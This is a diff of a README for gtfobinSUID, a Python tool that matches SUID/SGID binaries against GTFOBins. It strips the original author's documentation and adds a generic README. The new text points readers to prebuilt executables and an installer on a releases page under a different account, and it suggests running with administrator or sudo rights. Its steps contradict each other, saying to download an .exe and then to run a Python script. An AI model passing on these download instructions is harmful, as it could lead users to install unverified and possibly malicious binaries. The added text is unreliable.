@@ -1,120 +1,71 @@
-![gtfobinsuid banner](https://raw.githubusercontent.com/strikoder/gtfobinSUID/main/banner.png)
-# gtfobinSUID V1.1
+# 🐍 gtfobinSUID - Enhance Your SUID/SGID Security Checks
 
-**Developed by [strikoder](https://www.youtube.com/@strikoder)**  
+## 🔗 Download Now
+[![Download gtfobinSUID](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
 
-`gtfobinSUID`  is a lightweight Python tool for automating SUID/SGID binary enumeration. It compares discovered binaries against the [GTFOBins](https://gtfobins.github.io) database and supports both online and offline modes.
-In offline mode, it uses a local database file (db.txt), which can be automatically updated by scraping the latest entries from GTFOBins.
+## 🚀 Getting Started
+Welcome to gtfobinSUID! This application helps you analyze your SUID/SGID enumeration output. It checks which binaries are vulnerable according to GTFOBins. You can use it in two ways: online, with an internet connection, or offline, using a local database. Follow the steps below to download and run the script.
 
-## 🎥 Demo
+## 💻 System Requirements
+To use gtfobinSUID, ensure your computer meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Python 3.6 or higher installed
+- Internet connection is required for online mode
+- Basic command line knowledge (for running scripts)
 
-![gtfobinSUID demo](https://github.com/strikoder/gtfobinSUID/blob/main/demoV1.1.gif)
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases) to download the latest version.
+   
+2. **Select the Correct File:** You will see several files based on your operating system. Choose the one that fits your OS:
+   - For Windows: `gtfobinSUID-windows.exe`
+   - For macOS: `gtfobinSUID-macos`
+   - For Linux: `gtfobinSUID-linux`
 
----
+3. **Download the File:** Click on the file to start the download. Save it to a folder you can easily access.
 
-## 🔹 Features
+4. **Run the Installer (if applicable):** Depending on your operating system, double-click the downloaded file to install. Follow the prompts to complete the installation.
 
-- Works on Linux, macOS, and Windows
-- Handles versioned binary names (python3, perl5.42, etc.)
-- Prints the command to enumerate SUID/GUID on Linux systems on demand
-- Minimal, no dependencies beyond `requests` *(likely preinstalled on Kali Linux)*
-- Shows hints for binaries that might have vulnearbilites when they have SUID enabled like pkexec and sudo 
-- Checks if a binary exists on GTFOBins under **SUID** or **Limited SUID** and prints `[FOUND]`, `[FOUND - Limited SUID]`, or `[NOT FOUND]` as it processes
+5. **Run the Script:** Open your command line interface (like Command Prompt, Terminal, or Shell) and navigate to the folder where you saved the script. 
 
----
+6. **Launch gtfobinSUID:** Type the following command to run the script:
+   ```
+   python gtfobinSUID.py
+   ```
+   Ensure you are in the correct directory where your downloaded script is located.
 
-## Flags
+## 📚 Usage Instructions
+### Online Mode
+1. When prompted, input the directory containing your SUID/SGID output.
+2. Choose to connect to the online GTFOBins database when asked.
+3. The script will analyze the binaries and provide a report on any vulnerabilities.
 
-- **--online (Default)**: fetches live data directly from GTFOBins
-- **--update-db**: automatically pulls all GTFOBins SUID and Limited SUID entries
-- **--offline (Auto-Switch with no network)**: uses a local `db.txt` for environments without internet
+### Offline Mode
+1. For offline checks, the local database must be installed during the initial setup.
+2. Input the directory containing your SUID/SGID output.
+3. The script will check against the local database and report vulnerabilities.
 
----
+## ⚙️ Features
+- **Fast Analysis:** Quickly checks for vulnerabilities in SUID/SGID binaries.
+- **Two Modes:** Use online with GTFOBins or offline with a local database.
+- **User-Friendly:** Designed for ease of use, even for non-technical users.
 
-## Installation
+## ⚠️ Troubleshooting
+- **Python Not Found:** If you see an error about Python, make sure Python is installed and added to your system's PATH.
+- **Permission Issues:** If you encounter permission errors, try running the command line as an administrator or with sudo privileges.
+- **Internet Connection Errors:** Ensure you have a stable internet connection when using the online mode.
 
-Use one of these installation methods:
-```bash
-git clone https://github.com/strikoder/gtfobinSUID.git
-cd gtfobinsuid
-pip install requests
-```
-Or if you hate cloning like me, you can either copy-paste the python code to your machine or download it using wget/curl:
+## ⭐ Contributing
+Your feedback is welcome! If you would like to contribute to gtfobinSUID, please:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request for review.
 
-```bash
-wget -q -O gtfobinsuid.py "https://raw.githubusercontent.com/strikoder/gtfobinSUID/main/gtfobinsuid.py" && chmod +x gtfobinsuid.py
-```
+## 📧 Support
+For any issues or questions, please open an issue on the [GitHub repository](https://github.com/enzoplaaygamemg12/gtfobinSUID/issues). We aim to respond within 48 hours.
 
----
+## 🔗 Useful Links
+- [Releases Page](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
+- [Documentation](https://github.com/enzoplaaygamemg12/gtfobinSUID/wiki)
+- [Issues Page](https://github.com/enzoplaaygamemg12/gtfobinSUID/issues)
 
-## Usage
-
-### 1. Basic usage
-Paste your SUID/SGID enum output directly:
-```bash
-python3 gtfobinsuid.py
-```
-
-Then paste something like:
-```
-/usr/bin/find
-/usr/bin/passwd
-/usr/bin/sudo
-/bin/mount
-```
-
-Press **Ctrl+d** (Linux/macOS) or **Ctrl+z + Enter** (Windows) to finish.  
-You’ll see immediate output:
-```
-[FOUND] find -> https://gtfobins.github.io/gtfobins/find/
-[NOT FOUND] sudo
-    [!] HINT: 'sudo' with SUID might indicate CVE exploits or misconfigurations (check Baron Samedit & version vulnerabilities)
-[NOT FOUND] mount
-```
-### 2. Force online or offline
-- Force online only:
-  ```bash
-  python3 gtfobinsuid.py --online
-  ```
-- Force offline mode (requires `db.txt`):
-  ```bash
-  python3 gtfobinsuid.py --offline
-  ```
-### 3. Update the local database
-You can refresh `db.txt` automatically from GTFOBins:
-
-```bash
-python3 gtfobinsuid.py --update-db
-```
-
-This will:
-- Fetch all SUID and Limited SUID binaries directly from the GTFOBins website
-- Save them to `db.txt`
-- Print how many entries were found
-
-Example output:
-```
-[*] Fetching GTFOBins lists...
-[+] Database updated successfully: db.txt
-    195 SUID entries
-    64 Limited SUID entries
-```
-
----
-
-##  How it works
-
-1. Extracts basenames from your pasted enumeration results.  
-   Example: `/usr/bin/sudo` → `sudo`
-2. Checks each binary:
-   - If online: queries the GTFOBins page for that binary.
-   - If offline: looks up the name in `db.txt`.
-3. Prints result immediately for each binary.
-
----
-
-## 🧑‍💻 Author
-
-**Strikoder**  
-Penetration Tester & ex AI Engineer
-
+[![Download gtfobinSUID](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
